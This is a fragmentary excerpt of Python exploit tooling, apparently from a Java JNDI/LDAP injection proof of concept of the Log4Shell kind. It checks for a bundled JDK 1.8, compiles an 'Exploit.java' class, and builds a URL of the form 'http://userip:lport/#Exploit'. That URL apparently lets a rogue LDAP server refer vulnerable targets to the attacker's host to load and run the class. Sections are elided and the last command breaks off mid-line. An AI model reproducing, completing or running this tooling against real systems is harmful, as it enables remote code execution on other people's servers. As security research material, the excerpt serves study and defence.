...
def checkJavaAvailible():
  javaver = subprocess.call(['./jdk1.8.0_60/bin/java', '-version'], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
  if(javaver != 0):
...
def createLdapServer(userip, lport):
  ...
  subprocess.run(["./jdk1.8.0_60/bin/javac", "Exploit.java"])

  url = "http://{}:{}/#Exploit".format(userip, lport)
  subprocess.run(["./jdk1.8.0_60/bin/java", "-cp",
